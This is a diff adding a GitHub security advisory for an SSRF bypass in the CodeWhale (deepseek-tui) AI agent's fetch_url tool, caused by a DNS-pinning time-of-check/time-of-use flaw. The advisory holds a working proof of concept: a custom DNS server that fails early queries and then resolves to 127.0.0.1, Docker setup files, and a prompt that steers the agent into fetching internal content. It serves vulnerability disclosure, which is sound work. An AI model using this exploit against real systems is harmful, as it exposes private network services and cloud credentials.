@@ -1,0 +1,126 @@
+{
+  "id": "GHSA-6v2g-fpxh-pmmh",
+  "modified": "2026-09-04T19:00:05.311955033Z",
+  "published": "2026-09-04T18:05:12Z",
+  "aliases": [
+    "CVE-2026-75856"
+  ],
+  "summary": "CodeWhale: SSRF‌ bypass - TOCTOU on DNS failure for DNS pinning",
+  "details": "### Maintainer resolution\n\nThe CodeWhale maintainers validated this report. The affected package ranges are recorded in the advisory metadata. Version 0.8.64 contains the fix in commit 26de44a8bd5051f8f944ea60b2c37ae1d2b7d25e. Users should upgrade to 0.8.64 or later. The original reporter analysis is preserved below.\n\n### Summary\nDNS-pinning failure allows natural failure of code, however with a custom DNS server that fails the initial requests and allows the secondary requests, it's possible to bypass the logic.\n\n\n### Details\nSimplified attack scenario:\n1. Attacker asks agent to visit the `mydomain.com`.\n2. CodeWhale tries to resolve the IP of `mydomain.com`, however, the custom DNS server that's controlled by the attacker marks the request DNS‌ query as failed (Time of Check). \n3. CodeWhale allows the code to continue as it expects it request to fail again.\n4. On the secondary (Time of Use), the DNS server resolves mydomain.com to a local IP (e.g., 127.0.0.1)\n5. The request is executed and the content from port 80 is returned to the attacker, allowing full bypass of SSRF mitigations.\n\nIn the [DNS-pinning](https://github.com/Hmbown/CodeWhale/blob/8dff2f7525ead210a01347b48f53ae3f20d094ec/crates/tui/src/tools/fetch_url.rs#L362) section, when DNS fails, the code is allowed to continue as it's expected to fail. However\n\n### PoC\nThis is a custom DNS server that fails the first requests (in this case, the first and second requests must fail, while the 3rd and 4th are allowed due to A and AAAA DNS queries). Here is the code for the DNS‌ server(for PoC, should be placed in `dnser/dns_resolver.py`:\n```python\n#!/usr/bin/env python3\n\"\"\"\nLocal DNS Resolver — customizable request/response handling.\nUses only the standard library + dnslib.\n\nUsage:\n    pip install dnslib\n    sudo python dns_resolver.py          # binds to 0.0.0.0:53 by default\n    python dns_resolver.py --port 5353   # unprivileged port for testing\n\"\"\"\n\nimport argparse\nimport socket\nimport threading\nfrom dnslib import DNSRecord, DNSHeader, RR, QTYPE, A, CNAME, AAAA\n\n\nUPSTREAM_DNS = (\"8.8.8.8\", 53)   # fallback resolver\n\n\ndef handle_no_aaaa(query: DNSRecord) -\u003e DNSRecord | None:\n    \"\"\"Drop all AAAA requests.\"\"\"\n    if QTYPE[query.q.qtype] == \"AAAA\":\n        reply = query.reply()\n        reply.header.rcode = 3  # NXDOMAIN\n        return reply\n    return None\n\ndef handle_blocked(query: DNSRecord) -\u003e DNSRecord | None:\n    \"\"\"Block domains by returning NXDOMAIN.\"\"\"\n    blocked = {\"blocked.example.com.\", \"ads.tracker.io.\"}\n    qname = str(query.q.qname)\n    if qname in blocked:\n        print(f\"  [BLOCKED] {qname}\")\n        reply = query.reply()\n        reply.header.rcode = 3          # NXDOMAIN\n        return reply\n    return None\n\nfailer = 0\nMAX_FAIL = 2\nMAX_SUCCESS = 2\n\ndef handle_overrides(query: DNSRecord) -\u003e DNSRecord | None:\n    global failer\n    \"\"\"Return hardcoded A records for specific names (split-horizon / local dev).\"\"\"\n    overrides: dict[str, str] = {\n        \"myapp.local.\":     \"127.0.0.1\",\n        \"devserver.local.\": \"192.168.1.100\",\n        \"mydomain.com.\":    \"127.0.0.1\",\n    }\n    qname = str(query.q.qname)\n    qtype = QTYPE[query.q.qtype]\n\n    if qname in overrides and qtype == \"A\":\n        failer += 1\n        cycle_pos = (failer - 1) % (MAX_FAIL + MAX_SUCCESS)  # position within cycle\n        should_fail = cycle_pos \u003c MAX_FAIL\n\n        print(f\"  [OVERRIDE] request={failer} cycle_pos={cycle_pos} fail={should_fail}\")\n\n        if should_fail:\n            reply = query.reply()\n            reply.header.rcode = 3\n            reply.header.ra = 0\n            return reply\n\n        ip = overrides[qname]\n        print(f\"  [OVERRIDE] {qname} → {ip}\")\n        reply = query.reply()\n        reply.add_answer(RR(qname, QTYPE.A, rdata=A(ip), ttl=0))\n        reply.header.ra = 0\n        return reply\n\n    return None\n\n\ndef handle_rewrite(query: DNSRecord) -\u003e DNSRecord | None:\n    \"\"\"Rewrite a CNAME transparently (resolve alias locally).\"\"\"\n    rewrites: dict[str, str] = {\n        # \"old.internal.\": \"new.internal.\",\n    }\n    qname = str(query.q.qname)\n    if qname in rewrites:\n        target = rewrites[qname]\n        print(f\"  [REWRITE] {qname} → {target}\")\n        reply = query.reply()\n        reply.add_answer(RR(qname, QTYPE.CNAME, rdata=CNAME(target), ttl=60))\n        return reply\n    return None\n\n\ndef handle_upstream(query: DNSRecord) -\u003e DNSRecord | None:\n    \"\"\"Forward the query to the upstream resolver.\"\"\"\n    try:\n        raw = query.pack()\n        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        sock.settimeout(3)\n        sock.sendto(raw, UPSTREAM_DNS)\n        data, _ = sock.recvfrom(4096)\n        sock.close()\n        reply = DNSRecord.parse(data)\n        print(f\"  [UPSTREAM] {query.q.qname} → {UPSTREAM_DNS[0]}\")\n        return reply\n    except Exception as e:\n        print(f\"  [UPSTREAM ERROR] {e}\")\n        return None\n\n\n# Chain of responsibility — handlers are tried in order; first non-None wins.\nHANDLERS = [\n    handle_blocked,\n    handle_overrides,\n    handle_rewrite,\n    handle_upstream,\n]\n\n\n# ─────────────────────────────────────────────────────────────────────────────\n#  Server plumbing — no need to edit below this line\n# ─────────────────────────────────────────────────────────────────────────────\n\ndef resolve(data: bytes) -\u003e bytes:\n    try:\n        query = DNSRecord.parse(data)\n        qname = str(query.q.qname)\n        qtype = QTYPE[query.q.qtype]\n        print(f\"[QUERY] {qtype} {qname}\")\n\n        for handler in HANDLERS:\n            reply = handler(query)\n            if reply is not None:\n                return reply.pack()\n\n        # Fallback: SERVFAIL\n        reply = query.reply()\n        reply.header.rcode = 2\n        return reply.pack()\n\n    except Exception as e:\n        print(f\"[ERROR] Failed to parse/handle query: {e}\")\n        return b\"\"\n\n\ndef udp_server(host: str, port: int) -\u003e None:\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    sock.bind((host, port))\n    print(f\"DNS resolver listening on {host}:{port} (UDP)\")\n    while True:\n        data, addr = sock.recvfrom(4096)\n        threading.Thread(\n            target=lambda d=data, a=addr: sock.sendto(resolve(d), a),\n            daemon=True,\n        ).start()\n\n\ndef tcp_server(host: str, port: int) -\u003e None:\n    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    srv.bind((host, port))\n    srv.listen(10)\n    print(f\"DNS resolver listening on {host}:{port} (TCP)\")\n\n    def handle_conn(conn: socket.socket) -\u003e None:\n        with conn:\n            length_bytes = conn.recv(2)\n            if len(length_bytes) \u003c 2:\n                return\n            length = int.from_bytes(length_bytes, \"big\")\n            data = conn.recv(length)\n            response = resolve(data)\n            conn.sendall(len(response).to_bytes(2, \"big\") + response)\n\n    while True:\n        conn, _ = srv.accept()\n        threading.Thread(target=handle_conn, args=(conn,), daemon=True).start()\n\n\ndef main() -\u003e None:\n    parser = argparse.ArgumentParser(description=\"Local DNS resolver\")\n    parser.add_argument(\"--host\", default=\"0.0.0.0\", help=\"Bind address\")\n    parser.add_argument(\"--port\", type=int, default=53, help=\"Bind port (use 5353 for unprivileged)\")\n    args = parser.parse_args()\n\n    t_udp = threading.Thread(target=udp_server, args=(args.host, args.port), daemon=True)\n    t_tcp = threading.Thread(target=tcp_server, args=(args.host, args.port), daemon=True)\n    t_udp.start()\n    t_tcp.start()\n\n    try:\n        t_udp.join()\n    except KeyboardInterrupt:\n        print(\"\\nShutting down.\")\n\n\nif __name__ == \"__main__\":\n    main()\n```\n\nDocker file to build it(`dnser/Dockerfile`):\n```bash\nFROM python:3.12-slim\n\nWORKDIR /app\n\nRUN pip install dnslib --no-cache-dir\n\nCOPY dns_resolver.py .\n\nEXPOSE 53/udp\nEXPOSE 53/tcp\n\nCMD [\"python\", \"-u\", \"dns_resolver.py\", \"--host\", \"0.0.0.0\", \"--port\", \"53\"]\n```\n\nThen to simplify the test, we can set everything in a container and make the agent use the local DNS resolver:\n\n\n\n`docker-compose.yml`:\n```yaml\nservices:\n  dns-resolver:\n    build: dnser\n    container_name: dns-resolver\n    restart: unless-stopped\n    networks:\n      dns-net:\n        ipv4_address: 10.0.1.2\n\n  a:\n    image: ghcr.io/hmbown/deepseek-tui:latest\n    container_name: tui\n    environment:\n      DEEPSEEK_API_KEY: sk-\n    stdin_open: true\n    tty: true\n    dns: 10.0.1.2\n    networks:\n      - dns-net\n    depends_on:\n      - dns-resolver\n    sysctls:\n      net.ipv6.conf.all.disable_ipv6: 1\n\n\n\nnetworks:\n  dns-net:\n    driver: bridge\n    ipam:\n      config:\n        - subnet: 10.0.1.0/24\n```\n\nThen to check everything we could simply:\n`sudo docker attach tui`\nPrompt: `read contnet of http://mydomain.com using fetch_url tools, no thinking just raw output`\nThe tool will allow the request to go through 127.0.0.1. To make sure it's not a false-positive I've also installed python in CodeWhale container and ran `python3 -m http.server 80` as root to make sure the request can actually read content.\n\nTo read the logs from dns-resolver:\n`sudo docker logs -f dns-resolver`\n\n\n### Impact\nSimilar to other SSRF bypasses, other services private on the system, private network, and cloud credentials are at risk.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "crates.io",
+        "name": "deepseek-tui",
+        "purl": "pkg:cargo/deepseek-tui"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0.8.5"
+            },
+            {
+              "last_affected": "0.8.41"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-6v2g-fpxh-pmmh/GHSA-6v2g-fpxh-pmmh.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "deepseek-tui",
+        "purl": "pkg:npm/deepseek-tui"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0.8.5"
+            },
+            {
+              "fixed": "0.8.41"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-6v2g-fpxh-pmmh/GHSA-6v2g-fpxh-pmmh.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "crates.io",
+        "name": "codewhale-tui",
+        "purl": "pkg:cargo/codewhale-tui"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0.8.41"
+            },
+            {
+              "fixed": "0.8.64"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-6v2g-fpxh-pmmh/GHSA-6v2g-fpxh-pmmh.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "codewhale",
+        "purl": "pkg:npm/codewhale"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0.8.41"
+            },
+            {
+              "fixed": "0.8.64"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-6v2g-fpxh-pmmh/GHSA-6v2g-fpxh-pmmh.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/Hmbown/CodeWhale/security/advisories/GHSA-6v2g-fpxh-pmmh"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-75856"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Hmbown/CodeWhale/commit/26de44a8bd5051f8f944ea60b2c37ae1d2b7d25e"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/Hmbown/CodeWhale"
+    },
+    {
+      "type": "WEB",
+      "url": "https://www.vulncheck.com/advisories/codewhale-before-ssrf-bypass-via-dns-pinning-toctou"
+    }
+  ]
+}
